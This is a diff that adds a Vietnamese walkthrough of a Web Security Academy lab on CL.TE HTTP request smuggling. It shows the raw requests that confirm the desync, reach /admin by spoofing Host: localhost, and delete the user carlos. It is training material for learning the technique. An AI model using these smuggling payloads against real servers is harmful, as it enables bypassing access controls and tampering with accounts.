@@ -130,6 +130,62 @@ Host: 0a1000dc03cf46e8c17a0d0100bf009b.web-security-academy.net
 Và kết quả sẽ trả về 404: Not Found. Sau khi submit request, kết quả thành công.
 
 # 6. Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+Cấu hình đoạn request sau:
+```
+POST / HTTP/1.1
+Host: 0aa800dc048c8579c2f33a540000004f.web-security-academy.net
+Content-Length: 6
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+
+0
+
+G
+```
+Khi submit request hai lần, ta nhận được message "Not Found", nguyên nhân là do request thứ hai có method là GPOST. Như vậy, website có lỗi HRS.
+
+Tiếp tục, để vào trang `/admin` thì ta cấu hình request sau:
+```
+POST / HTTP/1.1
+Host: 0aa800dc048c8579c2f33a540000004f.web-security-academy.net
+Content-Length: 32
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+
+0
+
+GET /admin HTTP/1.1
+Foo: x
+```
+Sau khi submit 2 lần, ta đã truy cập vào được `/admin`, tuy nhiên response trả về lại là `401 Unauthorized` với message "Admin interface only available to local users". Sau khi thử thêm các header `X-Host`, `X-Forwarded-For`, ... để giả localhost nhưng không thành công, ta sẽ thử thay đổi header `Host`. Tuy nhiên, khi thêm header `Host` vào bên dưới dòng `GET /admin HTTP/1.1` thì sẽ hiển thị lỗi "Duplicate header names are not allowed". 
+
+Để khắc phục vấn đề này, ta cấu hình request sau:
+```
+POST / HTTP/1.1
+Host: 0aa800dc048c8579c2f33a540000004f.web-security-academy.net
+Content-Length: 67
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+Content-Length: 10
+
+x=
+```
+Khi đó, request thứ 2 sẽ có dạng:
+```
+GET /admin HTTP/1.1
+Host: localhost
+Content-Length: 10
+
+x=POST / HTTP/1.1
+Host: 0aa800dc048c8579c2f33a540000004f.web-security-academy.net
+...
+```
+Như ta thấy, `Host` header thứ 2 đã được chuyển vào body nên không còn bị lỗi trùng header `Host` nữa. Sau khi submit, ta đến được trang `/admin`. Tiếp tục tương tự truy cập `/admin/delete?username=carlos`, kết quả thành công.
 
 # 7. Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
 
